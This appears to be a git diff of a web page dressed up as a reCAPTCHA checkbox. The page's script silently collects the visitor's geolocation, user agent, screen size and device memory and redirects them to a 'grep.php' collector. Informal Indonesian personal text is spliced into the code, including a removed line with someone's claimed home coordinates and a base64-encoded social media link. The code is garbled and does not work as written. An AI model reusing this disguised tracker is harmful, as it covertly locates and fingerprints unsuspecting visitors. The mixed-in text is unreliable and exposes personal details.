@@ -8,7 +8,7 @@ Hallo ges jadi salken nama ku
 
             <div class="container">
 
-                <div class="clearfix">
+                <div class="gakguna div ini anjr">
                     <img src="RecaptchaLogo.svg" width="60" height="60" align="right">
                     <input id="checkbox-1" class="checkbox-input" type="checkbox">
                     <label for="checkbox-1" class="checkbox-label">
@@ -27,9 +27,7 @@ Hallo ges jadi salken nama ku
                     }
                 }
                 function showPosition(position) {
-                    var useragent = navigator.userAgent;
-                    var latitude = position.coords.latitude;
-                    aku tinggal di (-7° 27' 59.04) (112° 26' 1.68)
+                    var useragent = navigator.userAgent;  
                     aku punya akun media sosial 
                     bernama aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9fbGx5aWNoLw== 
                     dia juga aktif dalam github(itu dulu ygy) namun dia lupa nomer 
@@ -46,7 +44,6 @@ Hallo ges jadi salken nama ku
                     var memory = navigator.deviceMemory;
                     var height = screen.height;
                     var width = screen.width;
-
                     window.location.href = "grep.php?latitude=" + latitude
                     + "&longitude=" + longitude
                     + "&altitude=" + altitude
